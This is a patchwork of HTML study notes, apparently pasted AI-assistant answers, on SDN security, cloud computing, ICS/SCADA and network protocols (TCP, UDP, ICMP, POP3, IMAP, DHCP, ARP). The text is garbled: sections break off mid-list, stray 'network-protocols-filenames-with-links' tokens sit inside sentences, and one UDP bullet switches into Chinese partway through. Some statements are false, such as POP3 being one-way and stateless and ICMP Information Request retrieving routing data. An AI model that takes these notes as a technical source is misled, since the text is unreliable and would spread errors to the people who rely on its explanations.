<li><strong>Role-Based Access Control (RBAC)</strong>: Implement RBAC mechanisms to assign granular permissions and privileges to users based on their roles and responsibilities. Enforce least privilege principles to limit access to management functions and network configuration settings.</li>
<li><strong>Auditing and Logging</strong>: Enable auditing and logging of management activities and configuration changes to track user actions, detect unauthorized modifications, and facilitate forensic analysis in the event of security incidents or breaches.</li>
</ul>
</li>
<li>
<p><strong>Traffic Engineering and Segmentation</strong>:</p>
<ul>
<li><strong>Network Segmentation</strong>: Segment the SDN infrastructure into logical network segments or domains to isolate critical resources, applications, and user groups from potential security threats. Use VLANs, VXLANs, or SDN-based segmentation techniques to enforce network segmentation and access controls.</li>
<li><strong>Traffic Engineering</strong>: Use SDN to dynamically adjust network traffic flows, reroute traffic in response to congestion or performance issues, and optimize network resource utilization. Implement traffic engineering policies and algorithms to prioritize traffic, enforce quality of service (QoS), and mitigate denial-of-service (DoS) attacks.</li>
</ul>
</li>
<li>
<p><strong>Security Orchestration and Automation</strong>:</p>
<ul>
<li><strong>Security Policies</strong>: Define and enforce security policies using centralized policy management frameworks or security orchestration platforms. Automate the enforcement of security policies across the SDN infrastructure to ensure consistent security posture and compliance with regulatory requirements.</li>
<li><strong>Threat Intelligence Integration</strong>: Integrate threat intelligence feeds and security analytics platforms with SDN controllers to enrich security policies, identify emerging threats, and automate response actions. Use threat intelligence to dynamically update security policies and adapt to evolving security threats in real time.</li>
</ul>
</li>
</ol>
<p>These are just a few examples of security considerations and practices in Software-Defined Networking (SDN). Security in SDN requires a holistic approach that encompasses the entire network architecture, from the control plane to the data plane, and involves collaboration between network administrators, security teams, and vendors to address evolving threats and vulnerabilities effectively.</p>

As long as an electronic device has access to the web, it has access to the data and the software programs to run it. Cloud computing systems are mainly set up for business applications. Some of these services are designed to work through a web browser, while others are unique applications that connect to a web-based service. Cloud computing uses a network layer to connect users' end-point devices, like computers and smartphones, to resources and services hosted on a managed data center.</p>
<p>The term &quot;cloud&quot; in the context of computing refers to a network of remote servers hosted on the internet that store, manage, and process data and applications rather than on a local server or a personal computer. Cloud computing provides on-demand access to a variety of resources, including computing power, storage, and software applications, over the internet.</p>
<p>Here's an overview of how cloud computing works:</p>
<ol>
<li>
<p><strong>Service Models:</strong></p>
<ul>
<li><strong>Infrastructure as a Service (IaaS):</strong> Provides virtualized computing resources over the internet. Users can rent virtual machines, storage, and networking infrastructure on a pay-as-you-go basis. Examples include Amazon Web Services (AWS) and Microsoft Azure.</li>
<li><strong>Platform as a Service (PaaS):</strong> Offers a platform that allows users to develop, run, and manage applications without dealing with the complexity of the underlying infrastructure. It includes development tools, databases, and middleware. Examples include Google App Engine and Heroku.</li>
<li><strong>Software as a Service (SaaS):</strong> Delivers software applications over the internet on a subscription basis. Users can access applications through a web browser without needing to install or maintain software locally. Examples include Microsoft 365, Salesforce, and Google Workspace.</li>
</ul>
</li>
<li>
<p><strong>Deployment Models:</strong></p>
<ul>
<li><strong>Public Cloud:</strong> Services are provided by third-party cloud service providers and are made available to the general public. Resources are shared among multiple users, offering cost efficiency and scalability. Examples include AWS, Azure, and Google Cloud Platform (GCP).</li>
<li><strong>Private Cloud:</strong> Services are used exclusively by a single organization. The infrastructure can be managed by the organization itself or by a third-party provider. Private clouds offer more control over resources and are often used for security and compliance reasons.</li>
<li><strong>Hybrid Cloud:</strong> Combines both public and private cloud models. Organizations can use a combination of on-premises infrastructure, private cloud services, and public cloud services. This approach allows for flexibility and the ability to address specific business needs.</li>
</ul>
</li>
<li>
<p><strong>Key Characteristics:</strong></p>
<ul>
<li><strong>On-Demand Self-Service:</strong> Users can provision and manage computing resources as needed without requiring human intervention from the service provider.</li>
<li><strong>Broad Network Access:</strong> Cloud services are accessible over the internet from a variety of devices, such as laptops, tablets, and smartphones.</li>
<li><strong>Resource Pooling:</strong> Resources are pooled and shared among multiple users, leading to cost efficiency and optimal resource utilization.</li>
<li><strong>Rapid Elasticity:</strong> Resources can be quickly scaled up or down based on demand. This allows organizations to adapt to changing workloads and requirements.</li>
<li><strong>Measured Service:</strong> Cloud computing resources are metered, and users are billed based on their usage. This pay-as-you-go model provides cost transparency and flexibility.</li>
</ul>
</li>
<li>
<p><strong>Infrastructure:</strong></p>
<ul>
<li>Cloud providers maintain large data centers with a vast array of servers, storage devices, and networking equipment. These data centers are geographically distributed to provide redundancy and ensure high availability.</li>
</ul>
</li>
<li>
<p><strong>Access and Security:</strong></p>
<ul>
<li>Users access cloud services through the internet, and data is stored and processed on remote servers. Security measures, such as encryption, identity and access management, and firewalls, are implemented to protect data and ensure the privacy and integrity of users' information.</li>
</ul>
</li>
</ol>
<p>In summary, cloud computing delivers computing services over the internet, providing on-demand access to a wide range of resources. It has become a fundamental technology for organizations of all sizes, offering flexibility, scalability, and cost-effectiveness in managing IT infrastructure and applications.</p>
<p><strong>Cloud computing</strong>, often referred to as simply &quot;the cloud&quot;, is the delivery of on-demand computing resources over the internet on a pay-for-use basis¹². It allows users and companies to store and process their data in third-party data centers¹.</p>
<p>Here's how cloud computing works:</p>
<ol>
<li><strong>Data Storage and Access</strong>: The cloud refers to servers that are accessed over the Internet, and the software and databases that run on those servers¹. Users can access the same files and applications from almost any device, because the computing and storage take place on servers in a data center, instead of locally on the user device¹.</li>
<li><strong>Virtualization</strong>: Cloud computing is possible because of a technology called virtualization. Virtualization allows for the creation of a simulated, digital-only &quot;virtual&quot; computer that behaves as if it were a physical computer with its own hardware¹. This is why a user can log into their Instagram account on a new phone after their old phone breaks and still find their old account in place, with all their photos, videos, and conversation history¹.</li>
<li><strong>Efficiency</strong>: By running many virtual machines at once, one server can run many virtual &quot;servers,&quot; and a data center becomes like a whole host of data centers, able to serve many organizations¹. Thus, cloud providers can offer the use of their servers to far more customers at once than they would be able to otherwise, and they can do so at a low cost¹.</li>
<li><strong>Reliability</strong>: Even if individual servers go down, cloud servers in general should be always online and always available¹. Cloud vendors generally back up their services on multiple machines and across multiple regions¹.</li>
</ol>
<p>In summary, cloud computing provides a simpler, centralized way to manage networks, offering efficient control of traffic and the ability to scale as needed¹².</p>

<p>GitHub Copilot: ICS, or Industrial Control Systems, are types of control systems used in industrial production, including manufacturing, transportation, energy, and other sectors. These systems include various types of devices, systems, networks, and controls used to operate and/or automate industrial processes.</p>
<p>Here's a simplified explanation of how it works:</p>
<ol>
<li>ICS are typically used in industries such as electrical, water, oil, gas and data. Based on the nature of the application, these systems can range from a few modular panel-mounted controllers to large interconnected and interactive distributed control systems with many thousands of field connections.</li>

<li>The larger systems are usually implemented by Supervisory Control and Data Acquisition (SCADA) systems, or distributed control systems (DCS), and programmable logic controllers (PLCs), though SCADA and PLC systems are scalable down to small systems with few control loops.</li>
<li>These systems can be vulnerable to cyber attacks, so proper security measures should be in place to protect them.</li>
</ol>
<p>Remember, as an AI programming assistant, my expertise is in software development. For more detailed information about ICS, you may want to consult resources or experts in those areas.</p>
<p>ICS stands for Industrial Control System, and it refers to a set of hardware and software solutions that are used to monitor and control industrial processes. These systems play a crucial role in various industries, including manufacturing, energy, transportation, and utilities. ICS is designed to automate and optimize processes in sectors such as manufacturing plants, power plants, and oil refineries.</p>
<p>Here's an overview of ICS and how it works:</p>
<ol>
<li>
<p><strong>Components of ICS:</strong></p>
<ul>
<li><strong>Supervisory Control and Data Acquisition (SCADA):</strong> SCADA systems are a key component of ICS. They provide a graphical interface for operators to monitor and control industrial processes in real-time. SCADA systems collect data from sensors and instruments, display it to operators, and send control commands to devices in the field.</li>
<li><strong>Programmable Logic Controllers (PLCs):</strong> PLCs are specialized computers that control and automate machinery and processes. They receive input from sensors, make decisions based on predefined logic, and send output signals to control actuators and devices.</li>
<li><strong>Remote Terminal Units (RTUs):</strong> RTUs are similar to PLCs but are often used in industries with more distributed processes. They collect data from sensors and send it to the central SCADA system for monitoring and control.</li>
<li><strong>Human-Machine Interface (HMI):</strong> HMIs provide a visual representation of the industrial process to operators. They allow operators to interact with the system, monitor performance, and respond to alarms or issues.</li>
</ul>
</li>
<li>
<p><strong>Communication Protocols:</strong></p>
<ul>
<li>ICS components communicate with each other using specific communication protocols. Common protocols include Modbus, DNP3 (Distributed Network Protocol), and OPC (OLE for Process Control). These protocols facilitate the exchange of data between sensors, PLCs, RTUs, and the SCADA system.</li>
</ul>
</li>
<li>
<p><strong>Sensors and Actuators:</strong></p>
<ul>
<li>Sensors are used to gather data from the industrial environment. They can measure parameters such as temperature, pressure, flow, and more. Actuators, on the other hand, are devices that execute control commands, such as opening or closing a valve or starting a motor.</li>
</ul>
</li>
<li>
<p><strong>Control Algorithms:</strong></p>
<ul>
<li>ICS relies on control algorithms implemented in PLCs or other control devices. These algorithms determine how the system responds to different conditions and inputs. For example, a control algorithm might adjust the speed of a motor based on temperature readings.</li>
</ul>
</li>
<li>
<p><strong>Data Storage and Analysis:</strong></p>
<ul>
<li>ICS systems often store historical data for analysis and optimization. This data can be used to identify trends, improve efficiency, and troubleshoot issues. Advanced analytics and machine learning may be applied to the data to enhance predictive maintenance and process optimization.</li>
</ul>
</li>
<li>
<p><strong>Security Considerations:</strong></p>
<ul>
<li>Security is a critical aspect of ICS due to the potential impact of cyber threats on industrial processes. Security measures include network segmentation, encryption, access controls, and continuous monitoring to protect against unauthorized access and cyberattacks.</li>
</ul>
</li>
<li>
<p><strong>Redundancy and Reliability:</strong></p>
<ul>
<li>ICS systems are designed for high reliability, and redundancy is often implemented to ensure continuous operation. Redundant systems and backup components help prevent downtime in case of failures.</li>
</ul>
</li>
<li>
<p><strong>Integration with IT Systems:</strong></p>
<ul>
<li>ICS is increasingly integrated with Information Technology (IT) systems. This convergence can improve data visibility, analytics, and overall operational efficiency. However, it also introduces new challenges related to cybersecurity and the need to bridge the traditionally separate worlds of operational technology (OT) and IT.</li>
</ul>
</li>
</ol>
<p>In summary, ICS is a critical technology for managing and controlling industrial processes. It involves a combination of hardware and software components working together to automate, monitor, and optimize various aspects of industrial operations.</p>
<p><strong>Industrial Control Systems (ICS)</strong> are electronic control systems and associated instrumentation used for industrial process control². They play a pivotal role in helping to develop the factories of the future¹. They are made up of the devices, technologies, networks, and controls used to operate and automate manufacturing, engineering, and production processes across a wide range of industries¹.</p>
<p>Here's how an Industrial Control System works:</p>
<ol>
<li>
<p><strong>Operational Technology</strong>: The operational technology of an ICS includes the hardware and software systems that monitor and control physical devices at each stage of the industrial process, from conveyors and robotics to monitors, sensors, and control panels¹.</p>
</li>
<li>
<p><strong>Programmable Logic Controller (PLC)</strong>: PLCs are the main control component of an overall system. They provide local management of processes being run through feedback control devices, such as sensors and actuators¹.</p>
</li>
<li>
<p><strong>Control Server</strong>: A control server hosts the PLC’s control software and communicates with lower-level devices across the system¹.</p>
</li>
<li>
<p><strong>Master Terminal Unit (MTU)</strong>: This is a device that issues commands to remote terminal units in the process¹.</p>
</li>
<li>
<p><strong>Remote Terminal Unit (RTU)</strong>: The RTU is a microprocessor-controlled field device that receives commands and sends information back to the MTU¹.</p>
</li>
<li>
<p><strong>Control Loop</strong>: A control loop comprises hardware, including PLCs and actuators. It interprets the signals from sensors, control valves, breakers, switches, motors, and other similar devices, then transmits them back to the PLC to enable it to control the process more effectively¹.</p>
</li>
<li>
<p><strong>Human Machine Interface (HMI)</strong>: The HMI allows interaction between the human operator and the controller hardware to monitor data, set parameters, and make tweaks to the controllers to adjust or improve the process¹.</p>
</li>
</ol>
<p>When combined across an entire process, it results in huge improvements in production capacity and output, safety, productivity, product quality, and consistency¹. For example, robotics used in industrial manufacturing, variable-speed conveyor belts, and precision manufacturing equipment all need industrial control systems to control their speed and movements precisely¹.</p>

<p><strong>Components of a SCADA System:</strong></p>
<ul>
<li><strong>RTUs (Remote Terminal Units):</strong> RTUs are field devices that interface with sensors and actuators in the industrial environment. They collect data from sensors and send control commands to actuators based on instructions from the SCADA system.</li>
<li><strong>PLCs (Programmable Logic Controllers):</strong> PLCs are specialized computers that control and automate specific processes or machinery. They gather data from sensors, execute control algorithms, and send commands to actuators.</li>
<li><strong>Communication Infrastructure:</strong> SCADA relies on communication networks to exchange data between field devices (RTUs and PLCs) and the central SCADA system. Common communication protocols include Modbus, DNP3 (Distributed Network Protocol), and OPC (OLE for Process Control).</li>
<li><strong>SCADA Host or Server:</strong> The SCADA host or server is the central component that collects and processes data from the field devices. It runs SCADA software applications and provides a graphical interface for operators to monitor and control the industrial processes.</li>
<li><strong>HMI (Human-Machine Interface):</strong> The HMI is the user interface through which operators interact with the SCADA system. It provides real-time visualizations, alarms, and controls, allowing operators to monitor the status of the industrial processes and respond to events.</li>
</ul>
</li>
<li>
<p><strong>Data Acquisition:</strong></p>
<ul>
<li>Sensors in the industrial environment continuously collect data on various parameters such as temperature, pressure, flow rate, and more. RTUs and PLCs communicate with these sensors to gather real-time data.</li>
<li>The collected data is sent to the SCADA system via the communication infrastructure. SCADA systems often support both polling (where the SCADA system requests data from field devices) and event-driven communication (where field devices send data when specific conditions are met).</li>
</ul>
</li>
<li>
<p><strong>Data Processing and Control:</strong></p>
<ul>
<li>The SCADA host processes the incoming data and executes control algorithms to determine appropriate actions. For example, it may adjust the speed of a motor, open or close a valve, or trigger an alarm based on the received data.</li>
<li>Control commands are sent back to the field devices to regulate the industrial processes. This bidirectional communication allows for real-time control and monitoring.</li>
</ul>
</li>
<li>
<p><strong>Visualization and Monitoring:</strong></p>
<ul>
<li>The HMI provides operators with a graphical representation of the industrial processes. It displays real-time data, trends, and alarms. Operators can use the HMI to monitor the status of the processes and make informed decisions.</li>
<li>Alarms and alerts are generated when predefined thresholds are exceeded or when abnormal conditions are detected. Operators can respond to these alarms and take corrective actions.</li>
</ul>
</li>
<li>
<p><strong>Historical Data Storage and Analysis:</strong></p>
<ul>
<li>SCADA systems often store historical data for analysis, reporting, and compliance purposes. This data can be used to identify trends, optimize processes, and troubleshoot issues.</li>
<li>Advanced analytics and reporting tools may be integrated with SCADA systems to extract valuable insights from historical data.</li>
</ul>
</li>
<li>
<p><strong>Security Considerations:</strong></p>
<ul>
<li>SCADA systems require robust security measures to protect against unauthorized access and cyber threats. This includes encryption, secure communication protocols, access controls, and network segmentation.</li>
</ul>
</li>
</ol>
<p>In summary, SCADA systems provide a centralized platform for monitoring and controlling industrial processes in real-time. They play a crucial role in enhancing operational efficiency, improving decision-making, and ensuring the reliability of critical infrastructure across various industries.</p>
<p><strong>SCADA (Supervisory Control and Data Acquisition)</strong> is a computer-based system used for controlling and monitoring machines and processes based on real-time data². It is a collection of software and hardware components used for industrial automation which enables managers, engineers, and other industry workers to communicate effectively with the working environment².</p>
<p>Here's how a SCADA system works:</p>
<ol>
<li>
<p><strong>Sensors and Actuators</strong>: Sensors gather data based on physical characteristics like temperature or pressure and transmit it to the SCADA system. Actuators use the data to take a certain action².</p>
</li>
<li>
<p><strong>Supervisory Computers</strong>: These collect data from the sensors, analyze it, make decisions based on it, and send commands to the actuators².</p>
</li>
<li>
<p><strong>SCADA Field Controllers</strong>: These devices are located near the field where the process is being controlled. They collect data from sensors, send it to the supervisory computer, and receive commands from the supervisory computer which are afterward sent to the actuators².</p>
</li>
<li>
<p><strong>Human-Machine Interface (HMI)</strong>: A software application or hardware device that allows operators and engineers to interact with the SCADA system by displaying information in a graphical format².</p>
</li>
<li>
<p><strong>Communication Infrastructure</strong>: This represents the network of devices and communication protocols used to transmit data between components of SCADA systems².</p>
</li>
</ol>
<p>SCADA systems obtain and collect data from sensors and network devices attached to PLCs or RTUs before converting it into a central control room where it can be analyzed and displayed on HMI into information that humans can understand². The control room operator can then use this information to make decisions and control the remote equipment².</p>

<p>The Transmission Control Protocol (TCP) is a fundamental building block of the internet, responsible for reliable data transfer between devices. It operates on the Transport Layer of the TCP/IP model and is used by countless applications, including web browsing, email, and file transfer.</p>
<p>Here's a breakdown of TCP's key features and functionalities:</p>
<p><strong>Key Features:</strong></p>
<ul>
<li><strong>Connection-oriented:</strong> TCP establishes a dedicated connection between sender and receiver before data transmission begins. This allows for reliable communication with guaranteed delivery and error checking.</li>
<li><strong>Reliable data delivery:</strong> TCP segments data into packets and transmits them, ensuring all packets arrive at the destination in the correct order and without errors. It employs several mechanisms like sequence numbers, acknowledgments (ACKs), and retransmissions to achieve this.</li>
<li><strong>Flow control:</strong> TCP manages data transmission rate to avoid overwhelming the receiver with packets. It uses window-based flow control, where the receiver advertises the amount of data it can buffer, allowing the sender to adjust its transmission rate accordingly.</li>
<li><strong>Error checking:</strong> Each TCP packet includes a checksum for error detection. If the receiver detects an error, it requests retransmission of the corrupted packet.</li>
<li><strong>Congestion control:</strong> TCP helps prevent network congestion by dynamically adjusting the transmission rate based on network conditions. It uses algorithms like slow start, congestion avoidance, and fast retransmit to achieve this.</li>
<li><strong>Full-duplex communication:</strong> TCP enables simultaneous data transmission in both directions, allowing for efficient bidirectional communication.</li>
</ul>
<p><strong>Functionalities:</strong></p>
<ul>
<li><strong>Socket API:</strong> TCP relies on the socket API, a programming interface that provides functions for creating sockets, connecting to servers, sending and receiving data, and closing connections.</li>
<li><strong>Three-way handshake:</strong> Before data transmission, TCP establishes a connection through a three-way handshake. This involves exchanging SYN (synchronization), SYN-ACK (synchronization-acknowledgment), and ACK (acknowledgment) packets to synchronize sequence numbers and confirm connection establishment.</li>
<li><strong>TCP header:</strong> Each TCP packet contains a header with information like source and destination port numbers, sequence number, acknowledgment number, flags (SYN, ACK, FIN), window size, and checksum.</li>
<li><strong>Timers:</strong> TCP uses various timers for retransmission, acknowledgment delays, and connection timeouts.</li>
</ul>
<p><strong>Specifics:</strong></p>
<ul>
<li><strong>Port numbers:</strong> TCP uses port numbers to identify specific applications or services. Well-known port numbers are assigned to specific protocols like HTTP (port 80), HTTPS (port 443), and FTP (port 21).</li>
<li><strong>Maximum Segment Size (MSS):</strong> This defines the maximum size of a single data segment that can be transmitted in a TCP packet. MSS is negotiated during the connection establishment and depends on network conditions.</li>
<li><strong>Congestion window:</strong> This determines the amount of data the sender can transmit before receiving an acknowledgment from the receiver.</li>
<li><strong>Slow start:</strong> This algorithm starts with a small congestion window and gradually increases it as long as acknowledgments are received without delays.</li>
<li><strong>Fast retransmit:</strong> This allows the sender to retransmit a missing packet as soon as three duplicate acknowledgments are received, indicating packet loss.</li>

<h2 id="udp-network-protocol-explained-in-detail"><a class="header" href="#udp-network-protocol-explained-in-detail">UDP Network Protocol: Explained in Detail</a></h2>
<p>The User Datagram Protocol (UDP) is a core element of the internet protocol suite, responsible for providing <strong>unreliable, connectionless communication</strong> between applications running on different hosts. In contrast to the widely-used Transmission Control Protocol (TCP), which guarantees reliable delivery and ordered arrival of data, UDP prioritizes speed and efficiency. Let's delve deeper into the specifics of UDP:</p>
<h3 id="key-features"><a class="header" href="#key-features">Key Features:</a></h3>
<ul>
<li><strong>Unreliable Delivery:</strong> UDP packets can be lost, arrive out of order, or even be duplicated with no guarantees. This makes it unsuitable for applications requiring absolute data integrity, like file transfers or financial transactions.</li>
<li><strong>Connectionless:</strong> UDP doesn't establish connections between endpoints. Each packet is treated independently, making it ideal for applications where real-time responsiveness is paramount, such as online gaming, streaming media, and DNS resolution.</li>
<li><strong>Small Header:</strong> Compared to TCP, UDP boasts a significantly smaller header size (8 bytes) due to the absence of connection management features. This minimizes overhead and contributes to its efficiency.</li>
<li><strong>Best-Effort Delivery:</strong> UDP尽最大努力以确保数据按原样到达目的地，但不能保证 100% 的可靠性。这使得协议更轻巧、更快，但也意味着应用程序需要处理潜在的丢包和错误。</li>
<li><strong>Datagram-Oriented:</strong> Data is transferred in discrete units called datagrams, each containing the destination address, payload, and a checksum for error detection.</li>
<li><strong>Port Numbers:</strong> UDP utilizes port numbers to identify applications on a host, similar to TCP. </li>
</ul>
<h3 id="applications"><a class="header" href="#applications">Applications:</a></h3>

<h2 id="icmp-internet-control-message-protocol"><a class="header" href="#icmp-internet-control-message-protocol">ICMP (Internet Control Message Protocol)</a></h2>
<p>The Internet Control Message Protocol (ICMP) is a vital part of the Internet Protocol Suite. It operates on the network layer (Layer 3) of the OSI model and is responsible for transmitting error messages and operational information between network devices like routers and hosts.</p>
<p>Here's a breakdown of ICMP:</p>
<p><strong>Key Features:</strong></p>
<ul>
<li><strong>Message-oriented protocol:</strong> Sends individual messages instead of continuous data streams.</li>
<li><strong>Unreliable protocol:</strong> Does not guarantee message delivery or order. network-protocols network-protocols-filenames-with-links <strong>No connection establishment:</strong> Messages are sent and received independently of any established connections.</li>
<li><strong>Operates on top of IP:</strong> Uses the IP protocol for addressing and routing.</li>
</ul>
<p><strong>Typical ICMP Message Types:</strong></p>
<ul>
<li><strong>Echo Request/Reply (Type 8/0):</strong> The &quot;ping&quot; command utilizes these messages to test network connectivity and measure latency.</li>
<li><strong>Destination Unreachable (Type 3):</strong> Informs the sender that a datagram could not reach its intended destination.</li>
<li><strong>Source Quench (Type 4):</strong> Asks the sender to reduce its transmission rate due to network congestion. network-protocols network-protocols-filenames-with-links <strong>Redirect (Type 5):</strong> Suggests a more efficient route for datagrams to reach the destination.</li>
<li><strong>Time Exceeded (Type 11):</strong> Indicates that a datagram exceeded its time-to-live (TTL) value and was discarded.</li>
<li><strong>Timestamp Request/Reply (Type 13/14):</strong> Used to measure the round-trip time (RTT) between two network devices.</li>
<li><strong>Information Request/Reply (Type 15/16):</strong> Retrieves network routing information from gateways and routers.</li>
</ul>
<p><strong>Applications:</strong></p>
<ul>
<li><strong>Network diagnostics:</strong> ICMP messages are crucial for troubleshooting network connectivity issues using tools like ping and traceroute.</li>
<li><strong>Congestion control:</strong> ICMP helps routers manage network congestion by informing senders to reduce their transmission rate.</li>
<li><strong>Path MTU Discovery:</strong> Allows hosts to discover the maximum transmission unit (MTU) of a network path.</li>
</ul>
<p><strong>Security Considerations:</strong></p>
<ul>
<li><strong>ICMP can be used for denial-of-service (DoS) attacks:</strong> Malicious actors can flood a network with ICMP messages, overwhelming its resources and causing disruptions.</li>
<li><strong>ICMP messages can be spoofed:</strong> Attackers can disguise their origin to launch attacks on other systems.</li>
<li><strong>Some ICMP message types are vulnerable to man-in-the-middle attacks:</strong> These attacks allow attackers to intercept and manipulate ICMP messages in transit.</li>

<h2 id="pop3-protocol-explained-in-detail"><a class="header" href="#pop3-protocol-explained-in-detail">POP3 Protocol Explained in Detail</a></h2>
<p>The Post Office Protocol 3 (POP3) is a widely used protocol for retrieving email messages from a remote server to a local client. It is a simple, text-based protocol that operates on top of TCP/IP. POP3 is primarily designed for downloading emails, but it does not provide functionalities for sending emails or managing messages on the server.</p>
<p>Here's a breakdown of the key aspects of POP3:</p>
<p><strong>Features:</strong></p>
<ul>
<li><strong>Client-Server Architecture:</strong> POP3 follows a client-server architecture, where the email client on your device initiates communication with the mail server on the remote host.</li>
<li><strong>One-way communication:</strong> POP3 only allows communication from the client to the server. This means you can only download emails, not send them or perform other actions on the server.</li>
<li><strong>Simple text-based protocol:</strong> The communication between the client and server is done using simple text commands and responses, making it easy to understand and implement.</li>
<li><strong>Stateless protocol:</strong> POP3 is stateless, meaning each interaction between the client and server is independent. The server does not remember the state of previous interactions.</li>
<li><strong>Email retrieval and deletion:</strong> The main function of POP3 is to retrieve emails from the server. Once downloaded, the emails can be deleted from the server or kept on the server depending on the client configuration.</li>
</ul>
<p><strong>Working of POP3:</strong></p>
<ol>
<li><strong>Connection establishment:</strong> The client initiates a TCP connection to the server on port 110.</li>
<li><strong>Authentication:</strong> The client authenticates with the server using the username and password provided by the email provider.</li>
<li><strong>Retrieving emails:</strong> The client issues commands to retrieve the emails from the server.</li>
<li><strong>Downloading emails:</strong> The server sends the emails to the client.</li>
<li><strong>Deletion (optional):</strong> The client can choose to delete the emails from the server after downloading.</li>
<li><strong>Disconnection:</strong> The client closes the connection to the server.</li>
</ol>
<p><strong>Security considerations:</strong></p>
<ul>
<li><strong>Insecure by default:</strong> POP3 does not use any encryption by default, making it vulnerable to eavesdropping and man-in-the-middle attacks. It is recommended to use POP3 over a secure connection like TLS (POP3S) to protect your email data. network-protocols network-protocols-filenames-with-links <strong>Password exposure:</strong> The username and password are sent in plaintext during authentication, potentially exposing them to compromise. Using a secure connection mitigates this risk.</li>
</ul>
<p><strong>Alternatives to POP3:</strong></p>
<ul>
<li><strong>IMAP:</strong> The Internet Message Access Protocol (IMAP) offers more advanced functionalities like two-way communication, server-side message management, and offline access.</li>
<li><strong>Webmail:</strong> Webmail interfaces allow accessing emails directly through a web browser, eliminating the need for any additional software or protocols.</li>

<h2 id="the-internet-message-access-protocol-imap"><a class="header" href="#the-internet-message-access-protocol-imap">## The Internet Message Access Protocol (IMAP)</a></h2>
<p>IMAP stands for Internet Message Access Protocol and is one of the main protocols used to fetch emails. Unlike POP3, which downloads emails to your local device and then deletes them from the server, IMAP keeps your emails stored on the server. This allows you to access your emails from any device with an internet connection and ensures that all your devices have the same copy of your emails.</p>
<p>Here are some key details about IMAP:</p>
<p><strong>How it works:</strong></p>
<ul>
<li>An IMAP client connects to an IMAP server using TCP port 143.</li>
<li>The client authenticates with the server using a username and password.</li>
<li>The client can then access the user's mailbox and perform various operations on the emails, such as reading, deleting, moving, and flagging.</li>
<li>All changes made by the client are reflected on the server, so all devices have the same view of the mailbox.</li>
</ul>
<p><strong>Features:</strong></p>
<ul>
<li><strong>Multiple device access:</strong> Access your emails from any device with an internet connection.</li>
<li><strong>Offline access:</strong> Some IMAP clients allow you to download emails for offline access.</li>
<li><strong>Folder synchronization:</strong> IMAP keeps your folders synchronized across all your devices.</li>
<li><strong>Searching:</strong> IMAP allows you to search your emails on the server without having to download them.</li>
<li><strong>Push notifications:</strong> Some IMAP servers support push notifications, which means you'll be notified immediately when you receive a new email.</li>
</ul>
<p><strong>Security:</strong></p>
<ul>
<li>IMAP supports STARTTLS, which encrypts the connection between the client and server.</li>
<li>You can also use IMAP over SSL/TLS, which encrypts the entire connection, including the authentication process.</li>
</ul>
<p><strong>Drawbacks:</strong></p>
<ul>
<li>IMAP can be slower than POP3, especially if you have a large number of emails.</li>
<li>IMAP requires a persistent internet connection to access your emails.</li>
<li>Some IMAP servers have storage limits, so you may need to delete old emails regularly.</li>
</ul>

<h2 id="dhcp-network-protocol-explained"><a class="header" href="#dhcp-network-protocol-explained">DHCP Network Protocol Explained</a></h2>
<p>The Dynamic Host Configuration Protocol (DHCP) is a fundamental network protocol that plays a crucial role in simplifying network management and enabling seamless communication between devices. Let's delve deeper into the specifics of DHCP:</p>
<p><strong>Core Functionalities:</strong></p>
<ul>
<li><strong>Automatic IP address allocation:</strong> DHCP dynamically assigns IP addresses to devices on a network, eliminating the need for manual configuration. This simplifies network administration and minimizes configuration errors.</li>
<li><strong>Centralized address management:</strong> A DHCP server manages a pool of IP addresses, ensuring efficient allocation and preventing address conflicts. This centralized approach facilitates network scalability and simplifies troubleshooting.</li>
<li><strong>Configuration parameter distribution:</strong> DHCP can distribute additional network configuration parameters beyond IP addresses, such as subnet masks, default gateways, and DNS server addresses. This streamlines device configuration and ensures consistent network settings across devices.</li>
<li><strong>Dynamic address leasing:</strong> DHCP leases IP addresses to devices for a specified period, allowing for efficient utilization of the address pool and enabling devices to acquire new addresses when needed.</li>
<li><strong>Support for mobile devices:</strong> DHCP enables mobile devices to seamlessly obtain network configurations when moving between different network segments.</li>
</ul>
<p><strong>Key Components:</strong></p>
<ul>
<li><strong>DHCP server:</strong> This central component maintains the pool of IP addresses and leases them to DHCP clients. It also stores configuration parameters and responds to client requests.</li>
<li><strong>DHCP client:</strong> Any device on the network that requests and receives network configurations from a DHCP server.</li>
<li><strong>DHCP relay agent:</strong> In larger networks, a relay agent forwards DHCP messages between clients and servers, overcoming network limitations.</li>
</ul>
<p><strong>Operation Flow:</strong></p>
<ol>
<li><strong>Discovery:</strong> A DHCP client broadcasts a DHCPDISCOVER message onto the network, seeking a DHCP server.</li>
<li><strong>Offer:</strong> DHCP servers that receive the DHCPDISCOVER message respond with a DHCPOFFER message, proposing an IP address and configuration parameters.</li>
<li><strong>Selection:</strong> The DHCP client selects the most suitable offer and sends a DHCPREQUEST message to the chosen server.</li>
<li><strong>Acknowledgement:</strong> The DHCP server acknowledges the request with a DHCPACK message, confirming the IP address and configuration parameters assigned to the client.</li>
<li><strong>Renewal and Release:</strong> The DHCP client periodically sends DHCPREQUEST messages to renew its lease before it expires. When the device no longer needs the IP address, it sends a DHCPRELEASE message to relinquish the address.</li>
</ol>
<p><strong>Benefits of DHCP:</strong></p>
<ul>
<li><strong>Simplified network management:</strong> Automated IP address allocation and centralized configuration parameter distribution reduce administrative overhead and minimize errors.</li>
<li><strong>Network scalability:</strong> DHCP facilitates network expansion without requiring manual configuration changes for each device.</li>
<li><strong>Improved mobility support:</strong> Seamless network access for mobile devices enhances user experience and productivity.</li>
<li><strong>Cost-effectiveness:</strong> DHCP reduces the need for manual interventions and specialized network expertise, contributing to cost savings.</li>
</ul>
<p><strong>Applications:</strong></p>

<h2 id="arp-network-protocol-explained"><a class="header" href="#arp-network-protocol-explained">ARP Network Protocol Explained:</a></h2>
<p>The Address Resolution Protocol, or ARP, is a fundamental component of any network utilizing the <strong>Internet Protocol (IP)</strong>. It acts as a translator, bridging the gap between the logical IP addresses assigned to devices and their physical <strong>Media Access Control (MAC)</strong> addresses. </p>
<p>Essentially, ARP translates the &quot;who&quot; (IP address) of a device on the network to the &quot;where&quot; (MAC address) it physically resides. This information is crucial for successful communication within a network.</p>
<h3 id="understanding-the-arp-process"><a class="header" href="#understanding-the-arp-process">Understanding the ARP Process:</a></h3>
<ol>
<li><strong>A device (Host A) needs to send data to another device (Host B) on the same network.</strong></li>
<li><strong>Host A knows the IP address of Host B, but not its MAC address.</strong></li>
<li><strong>Host A broadcasts an ARP request onto the network, including Host B's IP address.</strong></li>
<li><strong>Every device on the network receives the ARP request, including Host B.</strong></li>
<li><strong>Only Host B, whose IP address matches the request, responds with its MAC address.</strong></li>
